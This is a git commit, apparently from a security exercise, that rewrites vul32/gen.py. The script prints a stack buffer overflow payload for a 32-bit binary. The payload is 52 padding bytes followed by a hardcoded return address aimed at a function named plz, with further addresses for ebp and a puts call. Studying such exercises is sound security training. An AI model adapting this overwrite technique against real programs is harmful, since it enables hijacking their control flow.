566d41a7acaef004b1ac9f176a643416de46af37
leefige <liyifei15@mails.tsinghua.edu.cn>
2019-01-09 18:30:37 +0000

    take over.

--- vul32/gen.py
+++ vul32/gen.py
@@ -1,3 +1,9 @@
 #! /usr/bin/python
-addr = "\x3a\x86\x04\x08"
-print(";" * 64)
+
+ebp = '\xb8\xd5\xff\xff'
+puts_addr = '\x37\x86\x04\x08'      # call puts
+plz_addr = '\xa6\x86\x04\x08'       # plz ...
+
+
+print "G" * 52 + plz_addr
+
